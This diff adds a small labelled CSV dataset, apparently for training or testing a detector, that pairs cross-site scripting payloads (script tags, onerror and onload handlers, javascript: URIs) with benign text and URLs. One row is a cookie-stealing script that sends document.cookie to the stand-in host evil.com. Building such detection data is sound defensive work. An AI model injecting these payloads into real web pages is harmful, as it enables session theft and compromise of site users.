@@ -1,0 +1,21 @@
+Payload,Label
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<svg onload=alert(1)>,1
+javascript:alert(document.cookie),1
+<body onload=alert(1)>,1
+<iframe src="javascript:alert(1)">,1
+<div onmouseover="alert(1)">test</div>,1
+https://www.google.com/search?q=hello,0
+https://example.com/page?id=123,0
+Hello World,0
+normal text content here,0
+<p>This is a paragraph</p>,0
+user@example.com,0
+The quick brown fox jumps over the lazy dog,0
+<a href="https://example.com">link</a>,0
+SELECT * FROM users,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img/src=x onerror=prompt(1)>,1
+<svg><animate onbegin=alert(1)>,1
+<marquee onstart=alert(1)>,1
